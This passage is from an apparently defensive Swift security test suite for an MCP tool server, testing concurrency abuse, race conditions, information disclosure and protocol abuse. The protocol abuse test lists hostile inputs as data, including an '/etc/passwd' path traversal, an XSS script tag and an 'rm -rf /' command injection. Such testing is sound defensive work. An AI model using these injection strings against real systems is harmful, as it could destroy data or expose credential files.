                let endTime = CFAbsoluteTimeGetCurrent()

                let executionTime = endTime - startTime

                if result.success {
                    await logger.info("Large payload (\(size)) processed in \(executionTime * 1000)ms")
                    // Verify no sensitive data leaked
                    let output = result.content
                    let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                    XCTAssertFalse(containsSensitiveInfo, "Large payload should not leak sensitive info")
                } else {
                    await logger.info("Large payload (\(size)) properly rejected")
                }

                // Execution time should be reasonable even for large inputs
                XCTAssertLessThan(executionTime, 10.0, "Large payload processing should not exceed 10 seconds")

            } catch {
                await logger.info("Large payload (\(size)) caused error (good protection)")
            }
        }

        // Server should remain stable after memory exhaustion attempts
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain stable after memory exhaustion tests")
    }

    func testAttackSurface_ConcurrencyAbuse() async throws {
        // Test protection against concurrency-based attacks
        try await server.start()

        await logger.info("Starting concurrency abuse test")

        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil { return }

        let maxConcurrentRequests = 100
        var completedRequests = 0
        var failedRequests = 0
        var rateLimitedRequests = 0

        // Launch many concurrent requests
        await withTaskGroup(of: Bool.self) { group in
            for i in 0..<maxConcurrentRequests {
                group.addTask {
                    let context = MCPExecutionContext(
                        clientId: UUID(),
                        requestId: "concurrent_abuse_\(i)_\(UUID().uuidString)",
                        toolName: "system_info"
                    )

                    do {
                        let params = ["test": "concurrent_abuse"]
                        let result = try await tool!.performExecution(parameters: params, context: context)

                        if result.success {
                            return true
                        } else {
                            if let error = result.error {
                                let isRateLimited = error.message.contains("rate") ||
                                                   error.message.contains("limit") ||
                                                   error.message.contains("busy")
                                return isRateLimited
                            }
                            return false
                        }
                    } catch {
                        return false
                    }
                }
            }

            // Collect results
            for await success in group {
                if success {
                    completedRequests += 1
                } else {
                    failedRequests += 1
                }
            }
        }

        await logger.info("Concurrency abuse results - Success: \(completedRequests), Failed: \(failedRequests)")

        // Server should handle concurrent requests gracefully
        XCTAssertGreaterThan(completedRequests, 0, "Some requests should succeed")
        XCTAssertLessThan(failedRequests, maxConcurrentRequests, "Not all requests should fail")

        // Verify server is still responsive
        let finalContext = MCPExecutionContext(
            clientId: UUID(),
            requestId: "final_health_check",
            toolName: "system_info"
        )

        do {
            let params = ["categories": ["basic"]]
            let result = try await tool!.performExecution(parameters: params, context: finalContext)
            XCTAssertTrue(result.success, "Server should remain responsive after concurrency abuse")
        } catch {
            XCTFail("Server should remain responsive after concurrency abuse")
        }
    }

    func testAttackSurface_RaceConditionVulnerabilities() async throws {
        // Test for race condition vulnerabilities
        try await server.start()

        await logger.info("Starting race condition vulnerability test")

        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil { return }

        let sharedClientId = UUID()
        let raceConditionAttempts = 20

        // Simulate simultaneous requests from same client with conflicting parameters
        await withTaskGroup(of: (Bool, String).self) { group in
            for i in 0..<raceConditionAttempts {
                group.addTask {
                    let context = MCPExecutionContext(
                        clientId: sharedClientId,
                        requestId: "race_condition_\(i)_\(UUID().uuidString)",
                        toolName: "system_info",
                        metadata: ["race_test": i, "conflict": i % 2 == 0]
                    )

                    do {
                        // Use conflicting parameters to trigger race conditions
                        let params = [
                            "conflict_param": i % 2 == 0 ? "value_A" : "value_B",
                            "race_id": i
                        ]

                        let result = try await tool!.performExecution(parameters: params, context: context)
                        return (result.success, result.content.description)
                    } catch {
                        return (false, error.localizedDescription)
                    }
                }
            }

            // Collect and analyze results for inconsistencies
            var results: [(Bool, String)] = []
            for await result in group {
                results.append(result)
            }

            // Check for inconsistent results that might indicate race conditions
            let successfulResults = results.filter { $0.0 }.map { $0.1 }
            let uniqueResults = Set(successfulResults)

            if uniqueResults.count > 1 {
                await logger.warning("Inconsistent results detected - possible race condition vulnerability")
                await logger.info("Unique result patterns: \(uniqueResults.count)")
            }

            // Results should be consistent or fail gracefully
            XCTAssertTrue(uniqueResults.count <= 1 || successfulResults.isEmpty,
                         "Results should be consistent or fail gracefully")
        }

        // Verify server integrity after race condition tests
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should maintain integrity after race condition tests")
    }

    func testAttackSurface_InformationDisclosureAnalysis() async throws {
        // Test for information disclosure vulnerabilities
        try await server.start()

        await logger.info("Starting information disclosure analysis test")

        let toolsToTest = ["system_info", "shortcuts_execute", "voice_control", "health_check"]

        for toolName in toolsToTest {
            let tool = await toolsRegistry.getTool(name: toolName)
            if tool == nil { continue }

            await logger.info("Testing information disclosure for \(toolName)")

            // Test with various malicious parameters designed to extract information
            let disclosureAttempts = [
                ["debug": true],
                ["verbose": true],
                ["details": "all"],
                ["include_errors": true],
                ["show_stack_trace": true],
                ["debug_mode": "enabled"],
                ["verbose_errors": true],
                ["internal": true],
                ["system_info": "detailed"],
                ["leak": "information"]
            ]

            for (index, attempt) in disclosureAttempts.enumerated() {
                let context = MCPExecutionContext(
                    clientId: UUID(),
                    requestId: "disclosure_test_\(toolName)_\(index)_\(UUID().uuidString)",
                    toolName: toolName,
                    metadata: attempt
                )

                do {
                    let params = getTestParameters(for: toolName)
                    let result = try await tool!.performExecution(parameters: params, context: context)

                    if result.success {
                        let output = result.content.description

                        // Check for sensitive information disclosure
                        let containsSystemInfo = output.lowercased().contains("system") ||
                                                output.lowercased().contains("admin") ||
                                                output.lowercased().contains("root") ||
                                                output.lowercased().contains("password") ||
                                                output.lowercased().contains("secret") ||
                                                output.lowercased().contains("key") ||
                                                output.lowercased().contains("token")

                        let containsDebugInfo = output.lowercased().contains("debug") ||
                                             output.lowercased().contains("error") ||
                                             output.lowercased().contains("trace") ||
                                             output.lowercased().contains("stack") ||
                                             output.lowercased().contains("exception")

                        let containsPathInfo = output.contains("/") ||
                                             output.contains("\\") ||
                                             output.contains(".swift") ||
                                             output.contains(".plist") ||
                                             output.contains("Library")

                        if containsSystemInfo || containsDebugInfo || containsPathInfo {
                            await logger.warning("Potential information disclosure in \(toolName) with attempt \(index)")

                            // Check if it's legitimate system info or accidental disclosure
                            let isLegitimate = toolName == "system_info" && containsSystemInfo
                            if !isLegitimate {
                                XCTFail("Information disclosure vulnerability detected in \(toolName)")
                            }
                        }
                    }
                } catch {
                    // Check error messages for information disclosure
                    let errorMessage = error.localizedDescription.lowercased()
                    let containsSensitiveInfo = errorMessage.contains("path") ||
                                               errorMessage.contains("file") ||
                                               errorMessage.contains("directory") ||
                                               errorMessage.contains("system") ||
                                               errorMessage.contains("admin")

                    if containsSensitiveInfo {
                        await logger.warning("Error message disclosure in \(toolName): \(error.localizedDescription)")
                    }
                }
            }
        }

        // Server should not have leaked sensitive information
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain secure after information disclosure tests")
    }

    func testAttackSurface_ProtocolAbuseAttempts() async throws {
        // Test for protocol-level abuse and manipulation
        try await server.start()

        await logger.info("Starting protocol abuse test")

        let tool = await toolsRegistry.getTool(name: "system_info")
        if tool == nil { return }

        // Test various protocol manipulation attempts
        let protocolAbuseAttempts = [
            // Malformed request IDs
            (UUID(), "", "system_info"), // Empty request ID
            (UUID(), String(repeating: "a", count: 10000), "system_info"), // Oversized request ID
            (UUID(), "../../../etc/passwd", "system_info"), // Path traversal in request ID
            (UUID(), "<script>alert('xss')</script>", "system_info"), // XSS in request ID

            // Malicious tool names
            (UUID(), "req_123", ""), // Empty tool name
            (UUID(), "req_123", "../../../system"), // Path traversal in tool name
            (UUID(), "req_123", "system_info; rm -rf /"), // Command injection in tool name
            (UUID(), "req_123", "nonexistent_tool"), // Nonexistent tool

            // Special UUIDs
            (UUID(uuidString: "00000000-0000-0000-0000-000000000000")!, "req_123", "system_info"), // Nil UUID
            (UUID(uuidString: "ffffffff-ffff-ffff-ffff-ffffffffffff")!, "req_123", "system_info"), // Max UUID
        ]

        for (index, (clientId, requestId, toolName)) in protocolAbuseAttempts.enumerated() {
            await logger.info("Testing protocol abuse attempt \(index + 1)")

            let context = MCPExecutionContext(
                clientId: clientId,
                requestId: requestId,
                toolName: toolName
            )

            do {
                let params = ["test": "protocol_abuse"]
                let result = try await tool!.performExecution(parameters: params, context: context)

                // Should either fail or not expose sensitive information
                if result.success {
                    let output = result.content.description
                    let containsSensitiveInfo = checkForSensitiveInformation(output: output)
                    XCTAssertFalse(containsSensitiveInfo, "Protocol abuse should not leak sensitive info")
                } else {
                    // Expected behavior
                    await logger.info("Protocol abuse attempt \(index + 1) properly rejected")
                }
            } catch {
                // Expected for protocol abuse
                await logger.info("Protocol abuse attempt \(index + 1) threw error (expected)")
            }
        }

        // Server should remain stable after protocol abuse attempts
        let serverStatus = await server.getStatus()
        XCTAssertTrue(serverStatus.isRunning, "Server should remain stable after protocol abuse tests")
    }
}
